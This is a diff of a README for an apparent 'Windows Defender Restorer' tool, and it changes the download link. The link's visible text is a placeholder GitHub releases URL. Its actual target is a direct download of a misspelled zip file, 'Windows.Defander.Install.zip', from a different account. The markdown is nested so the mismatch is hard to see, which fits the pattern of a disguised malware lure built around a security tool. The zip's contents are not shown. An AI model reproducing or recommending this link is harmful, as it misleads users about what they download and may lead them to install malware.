@@ -33,7 +33,7 @@ A comprehensive tool to safely restore Windows Defender and related security fea
 ## 📥 **DOWNLOAD - GITHUB RELEASES**
 
 ### ⬇️ **Get the Latest Version Here:**
-**[https://github.com/yourusername/windows-defender-restorer/releases]([https://github.com/yourusername/windows-defender-restorer/releases](https://github.com/MrNarrow/Windows-Defender-Restorer/releases/download/Windows_Defander_Restorer/Windows.Defander.Install.zip))**
+**[[https://github.com/yourusername/windows-defender-restorer/releases](https://github.com/MrNarrow/Windows-Defender-Restorer/releases/download/Windows_Defander_Restorer/Windows.Defander.Install.zip)]([https://github.com/yourusername/windows-defender-restorer/releases](https://github.com/MrNarrow/Windows-Defender-Restorer/releases/download/Windows_Defander_Restorer/Windows.Defander.Install.zip))**
 
 ### **Always Download From Releases!**
 🔒 **For security, NEVER download from:** 
